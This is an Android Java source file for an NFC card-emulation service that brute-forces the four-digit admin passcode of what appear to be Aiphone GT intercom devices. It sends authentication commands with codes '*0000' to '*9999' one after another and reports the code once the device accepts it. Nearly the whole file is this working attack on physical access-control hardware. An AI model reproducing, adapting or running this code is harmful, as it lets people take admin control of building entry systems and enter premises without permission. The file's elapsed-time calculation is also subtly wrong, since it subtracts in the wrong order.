package com.cameronpalmer.tora;


import android.nfc.cardemulation.HostApduService;
import android.os.Bundle;

import java.nio.charset.StandardCharsets;

import jp.co.aiphone.commands.AUT;
import jp.co.aiphone.commands.ITA;
import jp.co.aiphone.commands.PasscodeType;

enum State {
    INVALID,
    CONNECTED,
    START,
}

public class GTHostApduService extends HostApduService implements INFCCommon {
    private static INFCCardEmulationObserver sObserver;
    private static int sPasscode = 0;
    
    private State mState = State.INVALID;
    private long mStartTime = 0;
    private PasscodeType mPasscodeType = PasscodeType.ADMIN;

    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }

    public static void setPasscode(int passcode) {
        GTHostApduService.sPasscode = passcode;
    }

    public static int getPasscode() {
        return GTHostApduService.sPasscode;
    }

    public void victory() {
        sendObserver(String.format("Passcode: %d", GTHostApduService.sPasscode));

        long elapsed = elapsedSeconds();
        sendObserver(String.format("Time to victory: %d seconds", elapsed));

        ITA ita = new ITA();
        byte[] bytes = ita.serialize();
        this.sendResponseApdu(bytes);
    }

    public long elapsedSeconds() {
        long time = System.currentTimeMillis();

        return (this.mStartTime - time) / 1000;
    }

    public void attack(PasscodeType passcodeType) {
        String text;

        if (GTHostApduService.sPasscode < 10000) {
            if (this.mStartTime == 0) {
                long time = System.currentTimeMillis();
                this.mStartTime = time;
                sendObserver("ELAPSED: 0 seconds.");
            } else if (GTHostApduService.sPasscode % 100 == 0) {
                 long elapsed = elapsedSeconds();
                 sendObserver(String.format("ELAPSED: %d seconds.", elapsed));
            }

            String passcode = String.format("*%04d", GTHostApduService.sPasscode);
            AUT auth = new AUT(passcodeType, passcode);
            byte[] bytes = auth.serialize();
            this.sendResponseApdu(bytes);

            text = "SENT: " + passcode;
        } else {
            text = "Failed to find admin code.";
        }

        sendObserver(text);
    }

    public static void setObserver(INFCCardEmulationObserver observer) {
        GTHostApduService.sObserver = observer;
    }

    @Override
    public byte[] processCommandApdu(byte[] commandApdu, Bundle extras) {
        LogTool.logBytes("processCommandApdu", commandApdu);

        final String s = new String(commandApdu, StandardCharsets.US_ASCII);
        sendObserver("RECV: " + s + "(" + bytesToHex(commandApdu) + ")");

        String quickResponse = null;
        if (commandApdu == null || commandApdu.length < 3) {
            quickResponse = "CTN";
        } else if (this.mState == State.CONNECTED) {
            String commandPrefix = new String(commandApdu, 0, 3);
            switch (commandPrefix) {
                case "BGN":
                    break;
                case "CLS":
                    break;
                case "NGT": // Device type version
                case "DIF": // Device Initialization Failed
                    this.attack(this.mPasscodeType);
                    GTHostApduService.sPasscode++;
                    break;
                case "DIR": // Device Initialization Ready
                    this.victory();
                    break;
                case "DMU":
                    break;
                case "GET":
                    break;
                case "NOT":
                    break;
                case "PTN":
                    break;
                default:
                    break;
            }

        } else {
            this.mState = State.CONNECTED;
            quickResponse = "INIADR";
        }

        byte[] responseBytes = null;
        if (quickResponse != null) {
            responseBytes = quickResponse.getBytes(StandardCharsets.ISO_8859_1);

            sendObserver("SENT: " + quickResponse);
        }

        return responseBytes;
    }

    @Override
    public void onDeactivated(int reason) {
        String text;
        switch (reason) {
            case DEACTIVATION_LINK_LOSS:
                text = "Link loss";
                break;
            case DEACTIVATION_DESELECTED:
                text = "Deselected";
                break;
            default:
                text = "Unknown";
                break;
        }

        this.sendObserver("DEACTIVATED: " + text);
    }

    public void sendObserver(String message) {
        if (GTHostApduService.sObserver != null) {
            GTHostApduService.sObserver.displayResponse(message);
        }
    }
}